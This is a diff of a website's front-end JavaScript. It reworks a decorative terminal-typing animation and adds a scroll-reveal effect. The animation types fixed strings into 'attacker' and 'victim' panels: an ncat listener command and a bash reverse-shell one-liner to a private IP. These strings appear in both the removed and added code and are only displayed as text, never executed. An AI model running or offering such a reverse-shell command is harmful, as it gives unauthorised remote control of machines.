@@ -68,23 +68,6 @@
 })();
 
 
-// Terminal typing animation v4 (stable, colored, both panels)
-(function(){
-  const A = document.querySelector('[data-ty="a"]');
-  const B = document.querySelector('[data-ty="b"]');
-  if(!A || !B) return;
-  const seqA = ["ncat -lvnp 4444", "listening on [any] 4444 ...", "connection received from 10.10.10.42"];
-  const seqB = ["bash -i >& /dev/tcp/10.10.10.10/4444 0>&1", "whoami", "www-data"];
-
-  function type(el, text, delay){
-    return new Promise(res=>{
-      let i = 0;
-      (function step(){
-        if(i < text.length){
-          el.textContent += text[i++];
-          setTimeout(step, delay);
-        } else { el.textContent += "\n"; res(); }
-      })();
     });
   }
   async function run(){
@@ -125,4 +108,39 @@
   }
   if(document.readyState !== 'loading') convertRouge();
   else document.addEventListener('DOMContentLoaded', convertRouge);
+})();
+
+
+// Terminal typing animation v5 (exactly two panels)
+(function(){
+  const A = document.querySelector('[data-ty="a"]'); // attacker
+  const B = document.querySelector('[data-ty="b"]'); // victim
+  if(!A || !B) return;
+  const seqA = ["ncat -lvnp 4444", "listening on [any] 4444 ...", "connection received from 10.10.10.42"];
+  const seqB = ["bash -i >& /dev/tcp/10.10.10.10/4444 0>&1", "whoami", "www-data"];
+  function type(el, text, delay){
+    return new Promise(res=>{ let i=0; (function step(){ if(i<text.length){ el.textContent += text[i++]; setTimeout(step, delay); } else { el.textContent+="\n"; res(); } })(); });
+  }
+  async function run(){ A.textContent=""; B.textContent=""; for(let i=0;i<Math.max(seqA.length, seqB.length);i++){ if(seqB[i]) await type(B, seqB[i], 22); if(seqA[i]) await type(A, seqA[i], 22); } }
+  const grid = document.querySelector('.term-grid'); let played=false;
+  const io = new IntersectionObserver(es=>{ es.forEach(e=>{ if(e.isIntersecting && !played){ played=true; run(); } }); }, {threshold:.12});
+  if(grid) io.observe(grid); else run();
+})();
+
+
+// Reveal + stagger
+(function(){
+  const els = Array.from(document.querySelectorAll('.reveal'));
+  const io = new IntersectionObserver((entries)=>{
+    for(const e of entries){
+      if(e.isIntersecting){
+        e.target.classList.add('is-in');
+        io.unobserve(e.target);
+      }
+    }
+  }, {threshold:.15});
+  els.forEach((el)=>io.observe(el));
+
+  const cards = Array.from(document.querySelectorAll('.grid .card'));
+  cards.forEach((el,i)=>{ el.classList.add('reveal'); el.style.transitionDelay = (i*60)+'ms'; });
 })();
